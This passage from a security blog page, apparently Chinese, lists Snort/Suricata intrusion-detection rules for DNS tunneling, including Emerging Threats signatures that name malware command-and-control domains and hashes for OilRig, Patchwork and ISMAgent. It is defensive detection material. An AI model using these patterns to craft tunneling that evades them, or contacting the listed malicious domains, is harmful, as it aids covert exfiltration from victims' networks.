<span class="nx">alert</span> <span class="nx">udp</span> <span class="nx">$EXTERNAL_NET</span> <span class="mi">53</span> <span class="o">-&gt;</span> <span class="nx">$HOME_NET</span> <span class="nx">any</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"INDICATOR-OBFUSCATION DNS tunneling attempt"</span><span class="p">;</span> <span class="nx">flow</span><span class="o">:</span><span class="nx">to_client</span><span class="p">,</span><span class="nx">no_stream</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|00 01 00 01 00 00 00 00|"</span><span class="p">;</span> <span class="nx">depth</span><span class="o">:</span><span class="mi">8</span><span class="p">;</span> <span class="nx">offset</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|00 07 06|(){}[]"</span><span class="p">;</span> <span class="nx">fast_pattern</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|00 0A 00 01|"</span><span class="p">;</span> <span class="nx">within</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:-</span><span class="mi">17</span><span class="p">;</span> <span class="nx">detection_filter</span><span class="o">:</span><span class="nx">track</span> <span class="nx">by_src</span><span class="p">,</span> <span class="nx">count</span> <span class="mi">25</span><span class="p">,</span> <span class="nx">seconds</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">service</span> <span class="nx">dns</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">policy</span><span class="o">-</span><span class="nx">violation</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">37891</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">2</span><span class="p">;)</span>

<span class="nx">alert</span> <span class="nx">udp</span> <span class="nx">$HOME_NET</span> <span class="nx">any</span> <span class="o">-&gt;</span> <span class="nx">$EXTERNAL_NET</span> <span class="mi">53</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"INDICATOR-OBFUSCATION DNS tunneling attempt"</span><span class="p">;</span> <span class="nx">flow</span><span class="o">:</span><span class="nx">to_server</span><span class="p">,</span><span class="nx">no_stream</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|00 01 00 00 00 00 00 00|"</span><span class="p">;</span> <span class="nx">depth</span><span class="o">:</span><span class="mi">8</span><span class="p">;</span> <span class="nx">offset</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span> <span class="nx">isdataat</span><span class="o">:</span><span class="mi">80</span><span class="p">,</span><span class="nx">relative</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|00 0A 00 01|"</span><span class="p">;</span> <span class="nx">within</span><span class="o">:</span><span class="mi">15</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">80</span><span class="p">;</span> <span class="nx">fast_pattern</span><span class="p">;</span> <span class="nx">detection_filter</span><span class="o">:</span><span class="nx">track</span> <span class="nx">by_src</span><span class="p">,</span> <span class="nx">count</span> <span class="mi">25</span><span class="p">,</span> <span class="nx">seconds</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">service</span> <span class="nx">dns</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">policy</span><span class="o">-</span><span class="nx">violation</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">37892</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">2</span><span class="p">;)</span>

<span class="nx">sid</span><span class="o">:</span><span class="mi">2100208</span> <span class="p">(</span><span class="nx">Tunneling</span> <span class="nx">IP</span> <span class="nx">over</span> <span class="nx">DNS</span> <span class="kd">with</span> <span class="nx">NSTX</span><span class="p">)</span>
<span class="nx">alert</span> <span class="nx">udp</span> <span class="nx">any</span> <span class="nx">any</span> <span class="o">-&gt;</span> <span class="nx">any</span> <span class="mi">53</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"GPL POLICY MISC Tunneling IP over DNS with NSTX"</span><span class="p">;</span> <span class="nx">byte_test</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span><span class="o">&gt;</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">12</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span> <span class="s2">"|00 10 00 01|"</span><span class="p">;</span> <span class="nx">offset</span><span class="o">:</span> <span class="mi">12</span><span class="p">;</span> <span class="nx">rawbytes</span><span class="p">;</span> <span class="nx">threshold</span><span class="o">:</span> <span class="nx">type</span> <span class="nx">threshold</span><span class="p">,</span> <span class="nx">track</span> <span class="nx">by_src</span><span class="p">,</span> <span class="nx">count</span> <span class="mi">50</span><span class="p">,</span> <span class="nx">seconds</span> <span class="mi">60</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">nstx</span><span class="p">.</span><span class="nx">dereference</span><span class="p">.</span><span class="nx">de</span><span class="o">/</span><span class="nx">nstx</span><span class="o">/</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">slashdot</span><span class="p">.</span><span class="nx">org</span><span class="o">/</span><span class="nx">articles</span><span class="o">/</span><span class="mi">00</span><span class="o">/</span><span class="mi">09</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mf">2230242.</span><span class="nx">shtml</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">policy</span><span class="o">-</span><span class="nx">violation</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">2100208</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">3</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">created_at</span> <span class="mi">2010</span><span class="nx">_09_23</span><span class="p">,</span> <span class="nx">updated_at</span> <span class="mi">2010</span><span class="nx">_09_23</span><span class="p">;)</span>

<span class="nx">sid</span><span class="o">:</span><span class="mi">2024504</span> <span class="p">(</span><span class="nx">ET</span> <span class="nx">TROJAN</span> <span class="nx">ISMAgent</span><span class="p">)</span>
<span class="nx">alert</span> <span class="nx">udp</span> <span class="nx">$HOME_NET</span> <span class="nx">any</span> <span class="o">-&gt;</span> <span class="nx">any</span> <span class="mi">53</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"ET TROJAN ISMAgent DNS Tunneling (microsoft-publisher . com)"</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|01 00 00 01 00 00 00 00 00 00|"</span><span class="p">;</span> <span class="nx">depth</span><span class="o">:</span><span class="mi">10</span><span class="p">;</span> <span class="nx">offset</span><span class="o">:</span><span class="mi">2</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|13|microsoft-publisher|03|com|00|"</span><span class="p">;</span> <span class="nx">nocase</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span> <span class="nx">fast_pattern</span><span class="p">;</span> <span class="nx">threshold</span><span class="o">:</span><span class="nx">type</span> <span class="nx">limit</span><span class="p">,</span> <span class="nx">track</span> <span class="nx">by_src</span><span class="p">,</span> <span class="nx">count</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">seconds</span> <span class="mi">60</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span> <span class="nx">former_category</span> <span class="nx">TROJAN</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">md5</span><span class="p">,</span><span class="nx">a70a08a1e17b820c7dc8ee1247d6bfa2</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">researchcenter</span><span class="p">.</span><span class="nx">paloaltonetworks</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="mi">2017</span><span class="o">/</span><span class="mi">07</span><span class="o">/</span><span class="nx">unit42</span><span class="o">-</span><span class="nx">oilrig</span><span class="o">-</span><span class="nx">uses</span><span class="o">-</span><span class="nx">ismdoor</span><span class="o">-</span><span class="nx">variant</span><span class="o">-</span><span class="nx">possibly</span><span class="o">-</span><span class="nx">linked</span><span class="o">-</span><span class="nx">greenbug</span><span class="o">-</span><span class="nx">threat</span><span class="o">-</span><span class="nx">group</span><span class="o">/</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">trojan</span><span class="o">-</span><span class="nx">activity</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">2024504</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">3</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">affected_product</span> <span class="nx">Windows_XP_Vista_7_8_10_Server_32_64_Bit</span><span class="p">,</span> <span class="nx">attack_target</span> <span class="nx">Client_Endpoint</span><span class="p">,</span> <span class="nx">deployment</span> <span class="nx">Perimeter</span><span class="p">,</span> <span class="nx">signature_severity</span> <span class="nx">Major</span><span class="p">,</span> <span class="nx">created_at</span> <span class="mi">2017</span><span class="nx">_07_28</span><span class="p">,</span> <span class="nx">malware_family</span> <span class="nx">Ismdoor</span><span class="p">,</span> <span class="nx">performance_impact</span> <span class="nx">Moderate</span><span class="p">,</span> <span class="nx">updated_at</span> <span class="mi">2017</span><span class="nx">_07_31</span><span class="p">;)</span>

<span class="nx">sid</span><span class="o">:</span><span class="mi">2025072</span> <span class="p">(</span><span class="nx">ET</span> <span class="nx">TROJAN</span> <span class="nx">Patchwork</span><span class="p">)</span>
<span class="nx">alert</span> <span class="nx">dns</span> <span class="nx">$HOME_NET</span> <span class="nx">any</span> <span class="o">-&gt;</span> <span class="nx">any</span> <span class="nx">any</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"ET TROJAN Patchwork DNS Tunneling (nsn1.winodwsupdates .me)"</span><span class="p">;</span> <span class="nx">dns_query</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">".nsn1.winodwsupdates.me"</span><span class="p">;</span> <span class="nx">isdataat</span><span class="o">:!</span><span class="mi">1</span><span class="p">,</span><span class="nx">relative</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span> <span class="nx">former_category</span> <span class="nx">TROJAN</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">docs</span><span class="p">.</span><span class="nx">google</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nb">document</span><span class="o">/</span><span class="nx">d</span><span class="o">/</span><span class="mi">1</span><span class="nx">oYX3uN6KxIX_StzTH0s0yFNNoHDnV8VgmVqU5WoeErc</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">trojan</span><span class="o">-</span><span class="nx">activity</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">2025072</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">2</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">affected_product</span> <span class="nx">Windows_XP_Vista_7_8_10_Server_32_64_Bit</span><span class="p">,</span> <span class="nx">attack_target</span> <span class="nx">Client_Endpoint</span><span class="p">,</span> <span class="nx">deployment</span> <span class="nx">Perimeter</span><span class="p">,</span> <span class="nx">signature_severity</span> <span class="nx">Major</span><span class="p">,</span> <span class="nx">created_at</span> <span class="mi">2017</span><span class="nx">_11_27</span><span class="p">,</span> <span class="nx">malware_family</span> <span class="nx">Patchwork</span><span class="p">,</span> <span class="nx">performance_impact</span> <span class="nx">Low</span><span class="p">,</span> <span class="nx">updated_at</span> <span class="mi">2017</span><span class="nx">_11_27</span><span class="p">;)</span>

<span class="nx">sid</span><span class="o">:</span><span class="mi">2025894</span> <span class="p">(</span><span class="nx">ET</span> <span class="nx">TROJAN</span> <span class="nx">OilRig</span><span class="p">)</span>
<span class="nx">alert</span> <span class="nx">dns</span> <span class="nx">$HOME_NET</span> <span class="nx">any</span> <span class="o">-&gt;</span> <span class="nx">any</span> <span class="mi">53</span> <span class="p">(</span><span class="nx">msg</span><span class="o">:</span><span class="s2">"ET TROJAN OilRig QUADAGENT DNS Tunneling"</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|01|"</span><span class="p">;</span> <span class="nx">offset</span><span class="o">:</span><span class="mi">2</span><span class="p">;</span> <span class="nx">depth</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|00 01 00 00 00 00 00|"</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span> <span class="nx">within</span><span class="o">:</span><span class="mi">7</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|04|mail|06|"</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span> <span class="nx">nocase</span><span class="p">;</span> <span class="nx">pcre</span><span class="o">:</span><span class="s2">"/^\d{6}/Ri"</span><span class="p">;</span> <span class="nx">content</span><span class="o">:</span><span class="s2">"|07|cpuproc|03|com|00|"</span><span class="p">;</span> <span class="nx">fast_pattern</span><span class="p">;</span> <span class="nx">distance</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span> <span class="nx">within</span><span class="o">:</span><span class="mi">13</span><span class="p">;</span> <span class="nx">nocase</span><span class="p">;</span> <span class="nx">threshold</span><span class="o">:</span> <span class="nx">type</span> <span class="nx">limit</span><span class="p">,</span> <span class="nx">count</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">seconds</span> <span class="mi">60</span><span class="p">,</span> <span class="nx">track</span> <span class="nx">by_src</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span> <span class="nx">former_category</span> <span class="nx">TROJAN</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">md5</span><span class="p">,</span><span class="nx">d51c2ffce844d42bab2f2c3131e3dbd4</span><span class="p">;</span> <span class="nx">reference</span><span class="o">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">researchcenter</span><span class="p">.</span><span class="nx">paloaltonetworks</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="mi">2018</span><span class="o">/</span><span class="mi">07</span><span class="o">/</span><span class="nx">unit42</span><span class="o">-</span><span class="nx">oilrig</span><span class="o">-</span><span class="nx">targets</span><span class="o">-</span><span class="nx">technology</span><span class="o">-</span><span class="nx">service</span><span class="o">-</span><span class="nx">provider</span><span class="o">-</span><span class="nx">government</span><span class="o">-</span><span class="nx">agency</span><span class="o">-</span><span class="nx">quadagent</span><span class="o">/</span><span class="p">;</span> <span class="nx">classtype</span><span class="o">:</span><span class="nx">trojan</span><span class="o">-</span><span class="nx">activity</span><span class="p">;</span> <span class="nx">sid</span><span class="o">:</span><span class="mi">2025894</span><span class="p">;</span> <span class="nx">rev</span><span class="o">:</span><span class="mi">2</span><span class="p">;</span> <span class="nx">metadata</span><span class="o">:</span><span class="nx">affected_product</span> <span class="nx">Windows_XP_Vista_7_8_10_Server_32_64_Bit</span><span class="p">,</span> <span class="nx">attack_target</span> <span class="nx">Client_Endpoint</span><span class="p">,</span> <span class="nx">deployment</span> <span class="nx">Perimeter</span><span class="p">,</span> <span class="nx">signature_severity</span> <span class="nx">Major</span><span class="p">,</span> <span class="nx">created_at</span> <span class="mi">2018</span><span class="nx">_07_25</span><span class="p">,</span> <span class="nx">malware_family</span> <span class="nx">QuadAgent</span><span class="p">,</span> <span class="nx">performance_impact</span> <span class="nx">Low</span><span class="p">,</span> <span class="nx">updated_at</span> <span class="mi">2018</span><span class="nx">_07_25</span><span class="p">;)</span>
</pre></div>
  </div>
</article>
<div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
<!--PC和WAP自适应版-->
<div id="SOHUCS" ></div> 
<script type="text/javascript"> 
(function(){ 
var appid = 'cysYUIjwy'; 
var conf = 'prod_71b5e53cad0d27b5ed44fa5219b069b5'; 
var width = window.innerWidth || document.documentElement.clientWidth; 
if (width < 960) { 
window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>

<script type="text/javascript" charset="utf-8" src="https://changyan.itc.cn/js/lib/jquery.js"></script>
<script type="text/javascript" charset="utf-8" src="https://changyan.sohu.com/js/changyan.labs.https.js?appid=cysYUIjwy"></script>    </div>
  </div>

  <footer class="footer">
    <div class="container">
      <div class="row">
       <ul class="col-sm-6 list-inline">
          <li class="list-inline-item"><a href="https://www.njcx.bid/authors.html">Authors</a></li>
          <li class="list-inline-item"><a href="https://www.njcx.bid/archives.html">Archives</a></li>
          <li class="list-inline-item"><a href="https://www.njcx.bid/categories.html">Categories</a></li>
          <li class="list-inline-item"><a href="https://www.njcx.bid/tags.html">Tags</a></li>
        </ul>
        <p class="col-sm-6 text-sm-right text-muted">
          本站由 <a href="https://github.com/getpelican/pelican" target="_blank">Pelican 生成</a> 后续 by <a href="https://github.com/njcx" target="_blank">nJcx</a>
        </p>
      </div>
    </div>
  </footer>
</body>

</html>